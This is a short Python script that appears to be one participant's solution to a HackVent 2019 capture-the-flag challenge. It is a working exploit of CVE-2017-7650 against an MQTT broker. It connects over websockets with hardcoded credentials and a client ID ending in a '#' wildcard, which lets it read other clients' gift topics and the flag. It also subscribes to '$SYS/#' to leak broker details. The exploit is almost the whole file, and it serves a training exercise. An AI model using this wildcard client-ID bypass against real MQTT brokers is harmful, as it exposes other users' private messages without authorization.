#!/bin/python3

# Bread Solution Day15, HackVent2019
import paho.mqtt.client as mqtt
import time

debug=False

#--------------- MQTT Vars ---------------#
# this is the issue you can add wildcards, to Client IDs CVE-2017-7650
client_id="0443215059901236/#"#0118807676477813/#" 
topic = 'HV19/gifts/'+client_id # this allows us to find /flag-tbd
#host = "hv19-avarx.8lu3.ch"   #broken (9 hours of my life)
host = "whale.hacking-lab.com" #working
port = 9001
transport="websockets"
protocol=mqtt.MQTTv31
user="workshop"
password='2fXc7AWINBXyruvKLiX'

#--------------- MQTT Functions ---------------#
def on_connect(client, userdata, flags, rc):
    if debug:
        print(f"Connected RC={str(rc)}")
    
def on_subscribe(client, userdata, flags, rc):
    print(f"Subbing RC: {str(rc)} {str(flags)}")

def on_message(client, userdata, message):
    print(f"topic: {message.topic}")
    print(f"payload: {str(message.payload.decode('utf-8'))}\n")
    
def on_disconnect(client, userdata, rc):
    if rc != 0:
        print("Unexpected disconnection.")

def on_log(client, userdata, level, buf):
    print(f"log: {buf}: {userdata}: {level}")

#--------------- MQTT Setup ---------------#
mqttc = mqtt.Client(client_id, clean_session=True, protocol=protocol, transport=transport)
mqttc.username_pw_set(user, password)
mqttc.on_message = on_message
mqttc.on_connect = on_connect
mqttc.on_disconnect = on_disconnect
if debug:
    mqttc.on_subscribe = on_subscribe
    mqttc.on_log = on_log
    
#--------------- MAIN Functions ---------------#
mqttc.connect(host, port, 300)
print(f"Connected to {host}:{port}")
mqttc.loop_start()
mqttc.subscribe(("$SYS/#", 0)) # leak CVE hint
mqttc.subscribe((topic, 0))    # Solve
time.sleep(1)
mqttc.loop_stop()
mqttc.disconnect()
print(f"Disconnected from {host}:{port}")
